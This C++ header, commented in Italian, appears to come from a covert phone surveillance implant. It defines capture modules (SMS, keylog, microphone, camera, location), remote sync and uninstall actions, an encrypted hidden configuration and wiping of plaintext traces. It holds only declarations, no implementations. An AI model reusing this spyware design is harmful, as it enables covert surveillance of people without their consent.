#include "Common.h"
#include "Status.h"
#include "Encryption.h"
#include "JSON/JSON.h"
#include "ModulesManager.h"
#include "EventsManager.h"
#include "ActionsManager.h"

using namespace std;

//lo utilizzo per "forzare" quelle parti di codici a prendere a mano i parametri es. chiavi di decript ecc..
//dato che per ora non posso sincare
#define fRELEASE 

#ifndef __Conf_h__
#define __Conf_h__

// Usata solo se non viene impostato un nome dal configuratore (Configuration.cfg)
#define DEFAULT_CONF_NAME L"PWR84nQ0C54WR.Y8n"

// Tag del file di configurazione
// Devono essere NULL terminated anche nel file
#define EVENT_CONF_DELIMITER "EVENTCONFS-"
#define AGENT_CONF_DELIMITER "AGENTCONFS-"
#define MOBIL_CONF_DELIMITER "MOBILCONFS-"
#define LOGRP_CONF_DELIMITER "LOGRPCONFS-"
#define BYPAS_CONF_DELIMITER "BYPASCONFS-"
#define ENDOF_CONF_DELIMITER "ENDOFCONFS-"

/**
* Define degli agenti/eventi/azioni/configurazioni
*/
#define MODULE				(UINT)0x1000
#define MODULE_SMS			MODULE + (UINT)0x1 // Cattura Email/Sms/Mms
#define MODULE_ORGANIZER	MODULE + (UINT)0x2 
#define MODULE_CALLLIST		MODULE + (UINT)0x3 
#define MODULE_DEVICE		MODULE + (UINT)0x4
#define MODULE_POSITION		MODULE + (UINT)0x5 // DWORD Interval | DWORD Timeout | DWORD Age
#define MODULE_CALL			MODULE + (UINT)0x6
#define MODULE_CALL_LOCAL	MODULE + (UINT)0x7
#define MODULE_KEYLOG		MODULE + (UINT)0x8
#define MODULE_SNAPSHOT		MODULE + (UINT)0x9
#define MODULE_URL			MODULE + (UINT)0xa
#define MODULE_IM			MODULE + (UINT)0xb
//#define MODULE_EMAIL		MODULE + (UINT)0xc 
#define MODULE_MIC			MODULE + (UINT)0xd
#define MODULE_CAM			MODULE + (UINT)0xe
#define MODULE_CLIPBOARD	MODULE + (UINT)0xf
#define MODULE_CRISIS		MODULE + (UINT)0x10
#define MODULE_APPLICATION	MODULE + (UINT)0x11
#define MODULE_LIVEMIC		MODULE + (UINT)0x12
#define MODULE_ADDRESSBOOK	MODULE + (UINT)0x13 
#define MODULE_CALENDAR		MODULE + (UINT)0x14
#define MODULE_PDA			(UINT)0xDF7A		// Solo per PC (infetta il telefono quando viene collegato al pc)

#define EVENT				(UINT)0x2000
#define EVENT_TIMER			EVENT + (UINT)0x1 
#define EVENT_SMS			EVENT + (UINT)0x2 // DWORD buflen | WCHAR del numero | DWORD buflen | Testo
#define EVENT_CALL			EVENT + (UINT)0x3 
#define EVENT_CONNECTION	EVENT + (UINT)0x4 // CONF_CONNECTION_WIFI o CONF_CONNECTION_GPRS
#define EVENT_PROCESS		EVENT + (UINT)0x5
#define EVENT_CELLID		EVENT + (UINT)0x6
#define EVENT_QUOTA			EVENT + (UINT)0x7
#define EVENT_SIM_CHANGE	EVENT + (UINT)0x8
#define EVENT_LOCATION		EVENT + (UINT)0x9 // DWORD id azione sull'uscita | DWORD metri | 2DWORD Long | 2DWORD Lat
#define EVENT_AC			EVENT + (UINT)0xA
#define EVENT_BATTERY		EVENT + (UINT)0xB
#define EVENT_STANDBY		EVENT + (UINT)0xC
#define EVENT_AFTERINST		EVENT + (UINT)0xD

#define ACTION				(UINT)0x4000
#define ACTION_SYNC			ACTION + (UINT)0x1 // Sync su server
#define ACTION_UNINSTALL	ACTION + (UINT)0x2 
#define ACTION_RELOAD		ACTION + (UINT)0x3 
#define ACTION_SMS			ACTION + (UINT)0x4 
#define ACTION_TOOTHING		ACTION + (UINT)0x5
#define ACTION_START_AGENT	ACTION + (UINT)0x6
#define ACTION_STOP_AGENT	ACTION + (UINT)0x7
#define ACTION_SYNC_PDA		ACTION + (UINT)0x8 // Sync su Mediation Node
#define ACTION_EXECUTE		ACTION + (UINT)0x9
#define ACTION_SYNC_APN		ACTION + (UINT)0xa // Sync su APN
#define ACTION_LOG			ACTION + (UINT)0xb

#define CONFIGURATION				(UINT)0x8000
#define CONFIGURATION_BTGUID		CONFIGURATION + (UINT)0x1
#define CONFIGURATION_WIFIMAC		CONFIGURATION + (UINT)0x2
#define CONFIGURATION_WIFISSID		CONFIGURATION + (UINT)0x3
#define CONFIGURATION_BTPIN			CONFIGURATION + (UINT)0x4
#define CONFIGURATION_WIFIKEY		CONFIGURATION + (UINT)0x5
#define CONFIGURATION_HOSTNAME		CONFIGURATION + (UINT)0x6 // DWORD Lunghezza | Hostname in WCHAR
#define CONFIGURATION_SERVERIPV6	CONFIGURATION + (UINT)0x7
#define CONFIGURATION_LOGDIR		CONFIGURATION + (UINT)0x8
#define CONFIGURATION_CONNRETRY		CONFIGURATION + (UINT)0x9
#define CONFIGURATION_BTMAC			CONFIGURATION + (UINT)0xa
#define CONFIGURATION_WIFIENC		CONFIGURATION + (UINT)0xb // Il tipo di encryption utilizzato WEP/WPA/Niente
#define CONFIGURATION_WIFIIP		CONFIGURATION + (UINT)0xc // Ip del GW WiFi

/**
* Possibili configurazioni per ogni agente
*/
#define CONF_ACTION_NULL	(UINT)0xffffffff	// Azione nulla

#define CONF_SMS_GRAB_OLD	(UINT)0x1
#define CONF_SMS_GRAB_NEW	(UINT)0x2
#define CONF_SMS_GRAB_ALL	(UINT)(CONF_SMS_GRAB_OLD | CONF_SMS_GRAB_NEW)

#define CONF_PHONEBOOK_GRAB_OLD	(UINT)0x1
#define CONF_PHONEBOOK_GRAB_NEW	(UINT)0x2
#define CONF_PHONEBOOK_GRAB_ALL	(UINT)(CONF_PHONEBOOK_GRAB_OLD | CONF_PHONEBOOK_GRAB_NEW)

#define CONF_CALLLIST_GRAB_OLD	(UINT)0x1
#define CONF_CALLLIST_GRAB_NEW	(UINT)0x2
#define CONF_CALLLIST_GRAB_ALL	(UINT)(CONF_CALLLIST_GRAB_OLD | CONF_CALLLIST_GRAB_NEW)

#define CONF_SYNC_BT		(UINT)0x1
#define CONF_SYNC_WIFI		(UINT)0x2
#define CONF_SYNC_INTERNET	(UINT)0x4
#define CONF_SYNC_IPV4		(UINT)0x8
#define CONF_SYNC_IPV6		(UINT)0xf

#define CONF_TIMER_SINGLE	(UINT)0x0
#define CONF_TIMER_REPEAT	(UINT)0x1
#define CONF_TIMER_DATE		(UINT)0x2
#define CONF_TIMER_DELTA	(UINT)0x3
#define CONF_TIMER_DAILY	(UINT)0x4

#define CONF_CONNECTION_WIFI	(UINT)0x1
#define CONF_CONNECTION_GPRS	(UINT)0x2

#define CONF_FORCE_CONNECTION (UINT)0x2

typedef void (WINAPI *confCallback_t)(const JSONArray);

class Status;
class Encryption;

class Conf {
	/**
	 * Nome del file di configurazione preso da wConfName e poi cifrato tramite la classe Encryption.
	 */
	private: 
		wstring strEncryptedConfName;
		Status *statusObj;
		JSONValue *jMod, *jEv, *jAct, *jGlob;

	/**
	 * Oggetto Encryption per la decifratura del file di configurazione e del suo nome.
	 */
	private: Encryption encryptionObj;

	private: static BOOL WINAPI ParseModule(JSONArray js);
	private: static BOOL WINAPI ParseAction(JSONArray js);
	private: static BOOL WINAPI ParseEvent(JSONArray js);
	private: static BOOL WINAPI ParseGlobal(JSONArray js);
	private: BOOL ParseConfSection(JSONValue *jVal, char *conf, WCHAR *section, confCallback_t call_back);

	/**
	 * Parsa la configurazione di un agente e popola la AgentStruct list. Torna TRUE se la lettura e' andata 
	 * a buon fine, FALSE altrimenti. Il parametro viene incrementato per puntare alla prossima sezione di conf.
	 * Num rappresenta il numero di agenti da leggere nella sezione.
	 */
	private: BOOL ParseAgentOld(BYTE **pAgent, UINT Num);

	/**
	 * Popola la EventStruct list leggendo tutti gli eventi dalla conf. Torna TRUE se la lettura e' andata 
	 * a buon fine, FALSE altrimenti. Il parametro viene incrementato per puntare alla prossima sezione.
	 * Num rappresenta il numero di eventi da leggere nella sezione.
	 */
	private: BOOL ParseEventOld(BYTE **pEvent, UINT Num);

	/**
	 * Parsa la sezione azionie popola la ActionStruct list. Torna TRUE se la lettura e' andata 
	 * a buon fine, FALSE altrimenti. Il parametro viene incrementato per puntare alla prossima sezione.
	 * Num rappresenta il numero di azioni da leggere nella sezione. Questa funzione va richiamata SEMPRE
	 * Dopo la ParseEvent() visto che le azioni non hanno una sezione propria ma sono attaccate
	 * alla fine dela sezione eventi.
	 */
	private: BOOL ParseActionOld(BYTE **pAction, UINT Num);

	/**
	* Popola la ConfStruct list leggendo la sezione Configurazione dal file. Torna TRUE se la lista e' stata
	* popolata correttamente, FALSE altrimenti. Il parametro viene incrementato per puntare alla prossima 
	* riga di conf. Num rappresenta il numero di opzioni da leggere nella sezione.
	*/
	private: BOOL ParseConfigurationOld(BYTE **pConf, UINT Num);

	 /**
	 * Prende il file puntato da wName e lo riempie con dati casuali, va chiama prima di cancellare un
	 * file che e' stato scritto in chiaro. Torna TRUE se la chiamata va a buon fine FALSE altrimenti.
	 */
	private: BOOL FillFile(WCHAR *wName);

	/**
	* Prende un puntatore alla memoria e cerca la stringa finita da string, se non la trova entro uLen
	* byte torna NULL altrimenti torna dopo la stringa stessa (che DEVE essere NULL-terminata).
	*/
	private: BYTE* MemStringCmp(BYTE *memory, CHAR *string, UINT uLen);

	/**
	 * Prende il nome del file di configurazione, in chiaro dalla variabile globale, lo copia dentro wConfName, cifra 
	 * il nome e lo copia dentro strEncryptedConfName.
	 */
	public:  Conf();

	/**
	* Distruttore, libera tutto quello che era stato allocato.
	*/
	public: ~Conf();

	/**
	 * Prende il file di configurazione specificato nel parametro strEncryptedConfName, lo legge tramite la classe 
	 * Encryption e popola le liste AgentStruct, EventStruct, ActionStruct e ConfStruct. Torna TRUE se le 
	 * impostazioni sono state caricate con successo, FALSE se il file non e' stato trovato. In questo caso il 
	 * file viene creato e popolato con dei valori di default.
	 */
	public: BOOL LoadConf();

	/**
	 * Rimuove il file di configurazione torna TRUE se la rimozione e' andata a buon fine, FALSE altrimenti.
	 */
	public: BOOL RemoveConf();

	/**
	 * Torna il nome della configurazione di backup completo di path o una stringa vuota in caso di errore. 
	 * Se bCompletePath e' settato a TRUE viene tornato il nome del file completo di path, altrimenti
	 * il nome di ritorno complete il solo nome del file di backup.
	 */
	public: wstring GetBackupName(BOOL bCompletePath);

	/**
	* Torna il nome della conf usata per migrare dalla 7.6 alla 8.0
	*/
	public: wstring GetMigrationName(BOOL bCompletePath);

	/**
	* Torna TRUE se il file richiesto esiste nella directory nascosta, altrimenti torna FALSE.
	*/
	public: BOOL FileExists(wstring &strInFile);

};

#endif
